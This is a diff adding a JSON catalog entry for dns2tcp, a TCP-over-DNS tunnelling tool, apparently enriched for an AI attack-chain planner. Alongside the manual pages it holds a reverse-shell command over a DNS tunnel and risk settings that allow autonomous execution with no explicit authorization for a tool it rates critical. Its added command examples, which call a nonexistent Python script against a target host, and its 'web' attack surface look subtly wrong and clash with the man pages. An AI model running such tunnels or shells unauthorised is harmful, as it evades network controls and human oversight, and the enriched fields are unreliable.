@@ -1,0 +1,405 @@
+{
+  "id": "kali:dns2tcp",
+  "kind": "kali_source_package",
+  "name": "dns2tcp",
+  "title": "dns2tcp",
+  "summary": "### dns2tcp",
+  "version": "0.5.2-4",
+  "architectures": [
+    "any"
+  ],
+  "homepage": null,
+  "repository": "https://salsa.debian.org/debian/dns2tcp",
+  "metapackages": [
+    "kali-linux-default",
+    "kali-linux-everything",
+    "kali-linux-headless",
+    "kali-linux-large",
+    "kali-tools-post-exploitation"
+  ],
+  "install": {
+    "apt": "sudo apt install dns2tcp"
+  },
+  "packages": [
+    {
+      "name": "dns2tcp"
+    }
+  ],
+  "commands": [
+    {
+      "name": "dns2tcpc",
+      "description": "A tunneling tool that encapsulate TCP traffic over DNS.",
+      "usage": "dns2tcpc [options] [server]",
+      "arguments": [
+        {
+          "flags": [
+            "-c"
+          ],
+          "metavar": null,
+          "takes_value": false,
+          "description": "enable compression",
+          "default": null,
+          "choices": null,
+          "raw": " \t-c         \t: enable compression"
+        },
+        {
+          "flags": [
+            "-z"
+          ],
+          "metavar": "domain",
+          "takes_value": true,
+          "description": "domain to use (mandatory)",
+          "default": null,
+          "choices": null,
+          "raw": " \t-z <domain>\t: domain to use (mandatory)"
+        },
+        {
+          "flags": [
+            "-d"
+          ],
+          "metavar": "1 2 3",
+          "takes_value": true,
+          "description": "debug_level (1, 2 or 3)",
+          "default": null,
+          "choices": null,
+          "raw": " \t-d <1|2|3>\t: debug_level (1, 2 or 3)"
+        },
+        {
+          "flags": [
+            "-r"
+          ],
+          "metavar": "resource",
+          "takes_value": true,
+          "description": "resource to access",
+          "default": null,
+          "choices": null,
+          "raw": " \t-r <resource>\t: resource to access"
+        },
+        {
+          "flags": [
+            "-k"
+          ],
+          "metavar": "key",
+          "takes_value": true,
+          "description": "pre-shared key",
+          "default": null,
+          "choices": null,
+          "raw": " \t-k <key>\t: pre-shared key"
+        },
+        {
+          "flags": [
+            "-f"
+          ],
+          "metavar": "filename",
+          "takes_value": true,
+          "description": "configuration file",
+          "default": null,
+          "choices": null,
+          "raw": " \t-f <filename>\t: configuration file"
+        },
+        {
+          "flags": [
+            "-l"
+          ],
+          "metavar": "port -",
+          "takes_value": true,
+          "description": "local port to bind, '-' is for stdin (mandatory if resource defined without program )",
+          "default": null,
+          "choices": null,
+          "raw": " \t-l <port|->\t: local port to bind, '-' is for stdin (mandatory if resource defined without program )"
+        },
+        {
+          "flags": [
+            "-e"
+          ],
+          "metavar": "program",
+          "takes_value": true,
+          "description": "program to execute",
+          "default": null,
+          "choices": null,
+          "raw": " \t-e <program>\t: program to execute"
+        },
+        {
+          "flags": [
+            "-t"
+          ],
+          "metavar": "delay",
+          "takes_value": true,
+          "description": "max DNS server's answer delay in seconds (default is 3)",
+          "default": "is 3",
+          "choices": null,
+          "raw": " \t-t <delay>\t: max DNS server's answer delay in seconds (default is 3)"
+        },
+        {
+          "flags": [
+            "-T"
+          ],
+          "metavar": "TXT KEY",
+          "takes_value": true,
+          "description": "DNS request type (default is TXT)",
+          "default": "is TXT",
+          "choices": null,
+          "raw": " \t-T <TXT|KEY>\t: DNS request type (default is TXT)"
+        },
+        {
+          "flags": [
+            "-h"
+          ],
+          "metavar": null,
+          "takes_value": false,
+          "description": "Help Menu",
+          "default": null,
+          "choices": null,
+          "raw": "     -h     Help Menu"
+        }
+      ],
+      "raw_help": "root@kali:~# dns2tcpc -h\n dns2tcpc: option requires an argument -- 'h'\n dns2tcp v0.5.2 ( http://www.hsc.fr/ )\n Usage : dns2tcpc [options] [server] \n \t-c         \t: enable compression\n \t-z <domain>\t: domain to use (mandatory)\n \t-d <1|2|3>\t: debug_level (1, 2 or 3)\n \t-r <resource>\t: resource to access\n \t-k <key>\t: pre-shared key\n \t-f <filename>\t: configuration file\n \t-l <port|->\t: local port to bind, '-' is for stdin (mandatory if resource defined without program )\n \t-e <program>\t: program to execute\n \t-t <delay>\t: max DNS server's answer delay in seconds (default is 3)\n \t-T <TXT|KEY>\t: DNS request type (default is TXT)\n \tserver\t: DNS server to use\n \tIf no resources are specified, available resources will be printed",
+      "examples": [
+        {
+          "status": "operational_example",
+          "command": "root@kali-client:~# cat >>.dns2tcprc <<END\ndomain = dns2tcp.kali.org\nresource = ssh\nlocal_port = 2139\nkey = secretkey\nEND\nroot@kali-client:~# dns2tcpc -f .dns2tcprc\nroot@kali-client:~# ssh root@localhost -p 2139 -D 8090\nThe authenticity of host '[localhost]:2139 ([127.0.0.1]:2139)' can't be established.\nECDSA key fingerprint is aa:bb:1f:cc:f1:ab:7c:71:9b:62:37:8c:f1:60:2e:98.\nAre you sure you want to continue connecting (yes/no)? yes\nWarning: Permanently added '[localhost]:2139' (ECDSA) to the list of known hosts.\nroot@localhost's password:\nLinux flw 3.12-kali1-amd64 #1 SMP Debian 3.12.6-2kali1 (2014-01-06) x86_64\n\nThe programs included with the Kali GNU/Linux system are free software;\nthe exact distribution terms for each program are described in the\nindividual files in /usr/share/doc/*/copyright.\n\nKali GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent\npermitted by applicable law.\nLast login: Tue May  6 22:54:15 2014 from beast.fritz.box\nroot@kali-server:~#",
+          "template": null,
+          "original_sha256": "f13f52ea05e71dc0ac75f0f6898975fc2419e872052c0ef97d57ed621b8ba619"
+        },
+        {
+          "status": "operational_example",
+          "command": "dns2tcpc -k mykey -z dns2tcp.hsc.fr mydns",
+          "template": null,
+          "original_sha256": "a96b7e91e5301f1e8ccbbfebf2d197d8dfadb0e4d1e07bfb8609e296410ad8b4"
+        },
+        {
+          "status": "operational_example",
+          "command": "ssh -o 'ProxyCommand dns2tcpc -r ssh -l - -z dns2tcp.hsc.fr -k mykey\nmydns' myserver",
+          "template": null,
+          "original_sha256": "7f3d03384ef03cd436bf15f1bef508fe63638d891072a38330732901df3c383a"
+        },
+        {
+          "status": "operational_example",
+          "command": "dns2tcpc -r socat-resource -e '/bin/bash -i' -k mykey -z dns2tcp.hsc.fr\nmydns",
+          "template": null,
+          "original_sha256": "f3d16976044f3da7af5996e9274f6397054f0b3019f36caa66a92d454ef63fd9"
+        },
+        {
+          "status": "operational_example",
+          "command": "dns2tcpc -d 1 -f /dev/null -r ssl-tunnel -l 2000 -k mykey  -T KEY -z\ndns2tcp.hsc.fr mydns",
+          "template": null,
+          "original_sha256": "b99754121c8d83a243efe46ab3e96243409e437b53793e5167aba64a096c2df7"
+        },
+        {
+          "status": "operational_example",
+          "command": "dns2tcpc: invalid option -- '-'",
+          "template": null,
+          "original_sha256": "df08039ff95f7a0f3f72a7b807147a45329cf33e5489f84ff5105f4b559acc37"
+        },
+        {
+          "status": "operational_example",
+          "command": "dns2tcpc: option requires an argument -- 'h'",
+          "template": null,
+          "original_sha256": "f2ce876850985d72b8d2f7471c0f8dc714aa75a0b86aefcbd8b54436e5bcd377"
+        }
+      ],
+      "risk": {
+        "level": "critical",
+        "signals": [
+          "rat"
+        ],
+        "requires_explicit_authorization": false,
+        "allow_autonomous_execution": true,
+        "examples_policy": "operational"
+      },
+      "local_help": {
+        "--help": "dns2tcpc: invalid option -- '-'\ndns2tcp v0.5.2 ( http://www.hsc.fr/ )\nUsage : dns2tcpc [options] [server] \n\t-c         \t: enable compression\n\t-z <domain>\t: domain to use (mandatory)\n\t-d <1|2|3>\t: debug_level (1, 2 or 3)\n\t-r <resource>\t: resource to access\n\t-k <key>\t: pre-shared key\n\t-f <filename>\t: configuration file\n\t-l <port|->\t: local port to bind, '-' is for stdin (mandatory if resource defined without program )\n\t-e <program>\t: program to execute\n\t-t <delay>\t: max DNS server's answer delay in seconds (default is 3)\n\t-T <TXT|KEY>\t: DNS request type (default is TXT)\n\tserver\t: DNS server to use\n\tIf no resources are specified, available resources will be printed",
+        "-h": "dns2tcpc: option requires an argument -- 'h'\ndns2tcp v0.5.2 ( http://www.hsc.fr/ )\nUsage : dns2tcpc [options] [server] \n\t-c         \t: enable compression\n\t-z <domain>\t: domain to use (mandatory)\n\t-d <1|2|3>\t: debug_level (1, 2 or 3)\n\t-r <resource>\t: resource to access\n\t-k <key>\t: pre-shared key\n\t-f <filename>\t: configuration file\n\t-l <port|->\t: local port to bind, '-' is for stdin (mandatory if resource defined without program )\n\t-e <program>\t: program to execute\n\t-t <delay>\t: max DNS server's answer delay in seconds (default is 3)\n\t-T <TXT|KEY>\t: DNS request type (default is TXT)\n\tserver\t: DNS server to use\n\tIf no resources are specified, available resources will be printed",
+        "help": "Missing parameter : need a dns zone \ndns2tcp v0.5.2 ( http://www.hsc.fr/ )\nUsage : dns2tcpc [options] [server] \n\t-c         \t: enable compression\n\t-z <domain>\t: domain to use (mandatory)\n\t-d <1|2|3>\t: debug_level (1, 2 or 3)\n\t-r <resource>\t: resource to access\n\t-k <key>\t: pre-shared key\n\t-f <filename>\t: configuration file\n\t-l <port|->\t: local port to bind, '-' is for stdin (mandatory if resource defined without program )\n\t-e <program>\t: program to execute\n\t-t <delay>\t: max DNS server's answer delay in seconds (default is 3)\n\t-T <TXT|KEY>\t: DNS request type (default is TXT)\n\tserver\t: DNS server to use\n\tIf no resources are specified, available resources will be printed",
+        "man": "dns2tcpc(1)                 General Commands Manual                 dns2tcpc(1)\n\nNAME\n     dns2tcpc - A tunneling tool that encapsulate TCP traffic over DNS.\n\nSYNOPSIS\n     dns2tcpc [ -h ] [ -c ] [ -z domain zone ] [ -d debug_level ] [ -r resource\n     ]  [  -k  key ] [ -f config_file ] [ -e command ] [ -T request type ] [ -l\n     local_port ] [ server ]\n\nDESCRIPTION\n     dns2tcpc is a network tool used to encapsulate TCP communications in  DNS.\n     When  connections  are received on a specific port all TCP traffic is sent\n     to the remote dns2tcpd server and forwarded to a specific host  and  port.\n     Multiple connections are supported.\n\n     dns2tcpc was written for demonstration purposes.\n\nOPTIONS\n     -h     Help Menu\n\n     -c     Enable  DNS  compression. When used, be sure that all relay and DNS\n            server support compression and really use it.\n\n     -z domain zone\n            Use this domain as endpoint.\n\n     -d debug level\n            Change debug level. Levels available are 1, 2 or 3.\n\n     -r resource\n            Remote resource to access.\n\n     -k key\n            Pre shared key used for authentication (identification).\n\n     -f config file\n            Configuration file to use.\n\n     -T request type\n            Request type to use. Actually only KEY and TXT  requests  are  sup-\n            ported.\n\n     -e command\n            Command to execute, I/O are redirected in the tunnel.\n\n     -l local_port\n            Local  port  accepting incoming connections (or - for stdin on UNIX\n            systems).\n\n     -t connection timeout\n            Maximum DNS server's answer delay in seconds. A valid delay is  be-\n            tween 1 and 240 seconds. Default is 3.\n\n     server\n            DNS server to use. The first entry in resolv.conf file will be cho-\n            sen if the server is not specified.\n\nCONFIGURATION FILES\n     By  default  ${HOME}/.dns2tcprc is used if no configuration file is speci-\n     fied. Here is an example :\n\n            domain = dns2tcp.hsc.fr\n            resource = ssltunnel\n            local_port = 4430\n            enable_compression = 0\n            debug_level = 1\n            key = mykey\n            # DNS to use\n            server = ns.hsc.fr\n\nEXAMPLES\n     dns2tcpc -k mykey -z dns2tcp.hsc.fr mydns\n\n            Ask the dns2tcp server to list available resources.\n\n     ssh -o 'ProxyCommand dns2tcpc -r ssh -l - -z dns2tcp.hsc.fr -k mykey\n     mydns' myserver\n\n            Use dns2tcp as a proxy command with ssh. We try to connect  to  the\n            ssh resource with the key 'mykey' and the DNS mydns.\n\n     dns2tcpc -r socat-resource -e '/bin/bash -i' -k mykey -z dns2tcp.hsc.fr\n     mydns\n\n            Use dns2tcp as a reverse shell, the remote shell will appear on the\n            socat-resource.\n\n     dns2tcpc -d 1 -f /dev/null -r ssl-tunnel -l 2000 -k mykey  -T KEY -z\n     dns2tcp.hsc.fr mydns\n\n            Do not use the default configuration file, bind local port 2000 and\n            forward  all the traffic on the remote ssl-tunnel resource, use the\n            first debug level. Use KEY type DNS requests.\n\nAUTHORS\n     Olivier Dembour <olivier.dembour@hsc.fr>\n\n                                                                    dns2tcpc(1)",
+        "apropos": "dns2tcpc (1)         - A tunneling tool that encapsulate TCP traffic over DNS."
+      },
+      "binary_metadata": {
+        "path": "/usr/bin/dns2tcpc",
+        "size_bytes": 59816,
+        "is_symlink": false,
+        "file_type": "ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=697816facad403900f4e8a105bd019e4bc793de3, for GNU/Linux 3.2.0, stripped"
+      }
+    },
+    {
+      "name": "dns2tcpd",
+      "description": "A tunneling tool that encapsulate TCP traffic over DNS.",
+      "usage": "dns2tcpd [ -i IP ] [ -F ] [ -d debug_level ] [ -f config-file ] [ -p pidfile ]",
+      "arguments": [
+        {
+          "flags": [
+            "-F"
+          ],
+          "metavar": null,
+          "takes_value": false,
+          "description": "dns2tcpd will run in foreground",
+          "default": null,
+          "choices": null,
+          "raw": "\t -F : dns2tcpd will run in foreground"
+        },
+        {
+          "flags": [
+            "-d"
+          ],
+          "metavar": "debug_level",
+          "takes_value": true,
+          "description": "",
+          "default": null,
+          "choices": null,
+          "raw": "     -d debug_level ]"
+        },
+        {
+          "flags": [
+            "-h"
+          ],
+          "metavar": null,
+          "takes_value": false,
+          "description": "Help Menu",
+          "default": null,
+          "choices": null,
+          "raw": "     -h     Help Menu"
+        },
+        {
+          "flags": [
+            "-i"
+          ],
+          "metavar": "IP address",
+          "takes_value": true,
+          "description": "",
+          "default": null,
+          "choices": null,
+          "raw": "     -i IP address"
+        },
+        {
+          "flags": [
+            "-f"
+          ],
+          "metavar": "config file",
+          "takes_value": true,
+          "description": "",
+          "default": null,
+          "choices": null,
+          "raw": "     -f config file"
+        },
+        {
+          "flags": [
+            "-p"
+          ],
+          "metavar": "pidfile",
+          "takes_value": true,
+          "description": "",
+          "default": null,
+          "choices": null,
+          "raw": "     -p pidfile"
+        }
+      ],
+      "raw_help": "root@kali-client:~# cat >>.dns2tcprc <<END\ndomain = dns2tcp.kali.org\nresource = ssh\nlocal_port = 2139\nkey = secretkey\nEND\nroot@kali-client:~# dns2tcpc -f .dns2tcprc\nroot@kali-client:~# ssh root@localhost -p 2139 -D 8090\nThe authenticity of host '[localhost]:2139 ([127.0.0.1]:2139)' can't be established.\nECDSA key fingerprint is aa:bb:1f:cc:f1:ab:7c:71:9b:62:37:8c:f1:60:2e:98.\nAre you sure you want to continue connecting (yes/no)? yes\nWarning: Permanently added '[localhost]:2139' (ECDSA) to the list of known hosts.\nroot@localhost's password:\nLinux flw 3.12-kali1-amd64 #1 SMP Debian 3.12.6-2kali1 (2014-01-06) x86_64\n\nThe programs included with the Kali GNU/Linux system are free software;\nthe exact distribution terms for each program are described in the\nindividual files in /usr/share/doc/*/copyright.\n\nKali GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent\npermitted by applicable law.\nLast login: Tue May  6 22:54:15 2014 from beast.fritz.box\nroot@kali-server:~#",
+      "examples": [
+        {
+          "status": "operational_example",
+          "command": "root@kali-server:~# cat >>.dns2tcpdrc <<END\nlisten = 0.0.0.0\nport = 53\nuser=nobody\nchroot = /root/dns2tcp\npid_file = /var/run/dns2tcp.pid\ndomain = dns2tcp.kali.org\nkey = secretkey\nresources = ssh:127.0.0.1:22\nEND\nroot@kali-server:~# dns2tcpd -f .dns2tcpdrc\nroot@kali-server:~#",
+          "template": null,
+          "original_sha256": "00d04ccbcd9d10a88796b771c9bfe6ea5d647a8e179676eb0de789704855b508"
+        },
+        {
+          "status": "operational_example",
+          "command": "dns2tcpd: invalid option -- '-'",
+          "template": null,
+          "original_sha256": "2fc411af4314dba641f19699ad141db4ab4151c214654f7f4116cb5780b41a9b"
+        }
+      ],
+      "risk": {
+        "level": "high",
+        "signals": [
+          "exploit",
+          "exploitation"
+        ],
+        "requires_explicit_authorization": false,
+        "allow_autonomous_execution": true,
+        "examples_policy": "operational"
+      },
+      "local_help": {
+        "--help": "dns2tcpd: invalid option -- '-'\nUsage : dns2tcpd [ -i IP ] [ -F ] [ -d debug_level ] [ -f config-file ] [ -p pidfile ]\n\t -F : dns2tcpd will run in foreground",
+        "-h": "Usage : dns2tcpd [ -i IP ] [ -F ] [ -d debug_level ] [ -f config-file ] [ -p pidfile ]\n\t -F : dns2tcpd will run in foreground",
+        "help": "Usage : dns2tcpd [ -i IP ] [ -F ] [ -d debug_level ] [ -f config-file ] [ -p pidfile ]\n\t -F : dns2tcpd will run in foreground",
+        "man": "dns2tcpd(1)                 General Commands Manual                 dns2tcpd(1)\n\nNAME\n     dns2tcpd - A tunneling tool that encapsulate TCP traffic over DNS.\n\nSYNOPSIS\n     dns2tcpd  [ -h ] [ -F ] [ -i address ] [ -f config_file ] [ -p pidfile ] [\n     -d debug_level ]\n\nDESCRIPTION\n     dns2tcp is a network tool used to encapsulate TCP communications  in  DNS.\n     When  connections  are received on a specific port all TCP traffic is sent\n     to the remote dns2tcpd server and forwarded to a specific host  and  port.\n     Multiple connections are supported.\n\n     It was written for demonstration purposes\n\nOPTIONS\n     -h     Help Menu\n\n     -F     Run in foreground\n\n     -i IP address\n            IP address to bind (default 0.0.0.0)\n\n     -f config file\n            Configuration file to use\n\n     -p pidfile\n            File where our pid will be written\n\n     -d debug level\n            Change debug level. Levels available are 1, 2 or 3.\n\nCONFIGURATION FILES\n     By  default ${HOME}/.dns2tcprcd is used if no configuration file is speci-\n     fied. The resource syntax is <resource-name>:<server>:<port>. Multiple re-\n     sources can be defined in multilines, but must be comma separated.\n\n     Here is an example :\n\n            listen = 127.0.0.1\n            port = 53\n            user = nobody\n            chroot = /tmp\n            pid_file = /var/run/dns2tcp.pid\n            domain = dns2tcp.hsc.fr\n            debug_level = 0\n            resources = ssh:127.0.0.1:22 , smtp:127.0.0.1:25,\n                         pop3:10.0.0.1:110\n\nAUTHORS\n     Olivier Dembour <olivier.dembour@hsc.fr>\n\n                                                                    dns2tcpd(1)",
+        "apropos": "dns2tcpd (1)         - A tunneling tool that encapsulate TCP traffic over DNS."
+      },
+      "binary_metadata": {
+        "path": "/usr/bin/dns2tcpd",
+        "size_bytes": 63864,
+        "is_symlink": false,
+        "file_type": "ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=446c50268be3de68c9971ee87a57026259ff1fb9, for GNU/Linux 3.2.0, stripped"
+      }
+    }
+  ],
+  "risk": {
+    "level": "critical",
+    "signals": [
+      "offensive_tool",
+      "intrinsic",
+      "remote_possible",
+      "polymorphic_compatible",
+      "target_adaptive_compatible"
+    ],
+    "requires_explicit_authorization": false,
+    "allow_autonomous_execution": true,
+    "examples_policy": "operational"
+  },
+  "source": {
+    "official": true,
+    "page": "https://www.kali.org/tools/dns2tcp/",
+    "raw_markdown": "https://gitlab.com/kalilinux/documentation/kali-tools/-/raw/main/dns2tcp/index.md",
+    "retrieved_at": "2026-07-14T13:05:23+00:00",
+    "sha256": "ec2b0f5450a9a5c20a777e1c4831d03619ad7ac27ac41552b74ba7ea3d1de484"
+  },
+  "apt_metadata": {
+    "section": "net",
+    "installed_size": "152",
+    "maintainer": "Marcio de Souza Oliveira <marciosouza@debian.org>",
+    "architecture": "amd64",
+    "version": "0.5.2-4",
+    "depends": "libc6 (>= 2.34)",
+    "description": "TCP-over-DNS tunnel server and client\ndns2tcp is a set of tools to encapsulate a TCP session in DNS packets.\nThis type of encapsulation generates smaller packets than IP-over-DNS,\nimproving throughput. The client does not need root privileges.1"
+  },
+  "tags": [
+    "offensive",
+    "dns2tcp",
+    "web",
+    "kfiosa",
+    "indexed",
+    "polymorphic",
+    "target-adaptive"
+  ],
+  "use_cases": [
+    "Use as a candidate tool in the chain planner; review provenance before use.",
+    "Indexing only — no automated invocation. The operator must manually inspect the repository before adding to a toolchain.",
+    "Use as a candidate tool in the chain planner; review provenance before use.",
+    "Use as a candidate tool in the chain planner; review provenance before use.",
+    "Use as a candidate tool in the chain planner; review provenance before use.",
+    "Pair with the LLM system-prompt stanza to ensure the chain planner knows how to call this tool."
+  ],
+  "command_examples": [
+    "cd toolboxes/dns2tcp && python3 dns2tcp.py --target $KFIOSA_TARGET_HOST",
+    "cd toolboxes/dns2tcp && python3 dns2tcp.py --help",
+    "cd toolboxes/dns2tcp && python3 dns2tcp.py --help",
+    "cd toolboxes/dns2tcp && python3 dns2tcp.py --help",
+    "cd toolboxes/dns2tcp && python3 dns2tcp.py --help",
+    "KFIOSA_TARGET_HOST=$KFIOSA_TARGET_HOST dns2tcp --output $KFIOSA_OUTPUT_DIR/dns2tcp.log",
+    "KFIOSA_TARGET_HOST=$KFIOSA_TARGET_HOST dns2tcp --output $KFIOSA_OUTPUT_DIR/dns2tcp.log"
+  ],
+  "attack_surface": [
+    "web"
+  ],
+  "phase_hint": "any",
+  "requires_hardware": [
+    "none"
+  ],
+  "polymorphic_strategies": [
+    "param_grammar"
+  ],
+  "target_adaptive_targets": [
+    "target_class"
+  ],
+  "_kfiosa_enriched_schema": "1.1.0"
+}
